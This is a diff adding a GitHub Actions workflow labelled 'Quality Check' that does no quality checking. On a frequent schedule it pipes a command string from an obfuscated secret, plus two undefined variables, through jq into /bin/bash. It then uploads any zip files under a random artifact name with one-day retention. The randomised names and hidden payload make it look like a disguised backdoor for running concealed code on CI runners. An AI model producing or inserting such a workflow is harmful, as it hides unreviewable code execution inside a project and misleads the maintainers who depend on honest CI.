@@ -1,0 +1,33 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '2 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          vqb808: ${{ secrets.vqb808 }}
+        run: |
+          printf '%s' "$vqb808" | jq -r .ifxld9207 | /bin/bash
+          echo $h26 | jq -r .ghf8 | /bin/bash
+          printf '%s' "$ov29" | jq -r .kkce03 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: fXmtDEVI
+          path: "*.zip"
+          retention-days: 1
